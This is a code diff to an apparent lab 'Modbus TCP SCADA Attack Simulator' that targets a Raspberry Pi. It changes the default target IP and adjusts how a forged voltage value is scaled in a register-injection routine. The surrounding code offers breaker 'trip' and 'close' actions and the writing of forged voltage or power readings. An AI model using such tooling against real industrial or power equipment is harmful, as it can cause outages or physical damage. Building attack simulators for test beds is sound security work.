@@ -35,7 +35,7 @@ BANNER = """
 
 class ModbusClient:
     """Lightweight pure-socket Modbus TCP client."""
-    def __init__(self, host="10.59.53.30", port=5020, timeout=3.0):
+    def __init__(self, host="10.175.107.30", port=5020, timeout=3.0):
         self.host = host
         self.port = port
         self.timeout = timeout
@@ -165,7 +165,7 @@ def run_register_injection(client):
         reg_num = int(input("  Register to overwrite [40001=Voltage, 40003=Power]: ").strip() or "40001")
         if reg_num == 40001:
             val_input = float(input("  Forged Voltage value in Volts [280.0]: ").strip() or "280.0")
-            raw_val = int(val_input * 10)
+            raw_val = int(val_input * 10) if val_input < 1000 else int(val_input)
             reg_addr = 0
         elif reg_num == 40003:
             raw_val = int(input("  Forged Power value in Watts [5000]: ").strip() or "5000")
@@ -188,7 +188,7 @@ def run_register_injection(client):
 def main():
     print(BANNER)
     parser = argparse.ArgumentParser(description="Modbus TCP SCADA Attack Simulator")
-    parser.add_argument('--target', default='10.59.53.30', help="Target Raspberry Pi IP")
+    parser.add_argument('--target', default='10.175.107.30', help="Target Raspberry Pi IP")
     parser.add_argument('--port', type=int, default=5020, help="Modbus TCP Port (default: 5020)")
     parser.add_argument('--action', choices=['recon', 'trip', 'close', 'inject', 'menu'], default='menu', help="Action to execute")
     args = parser.parse_args()
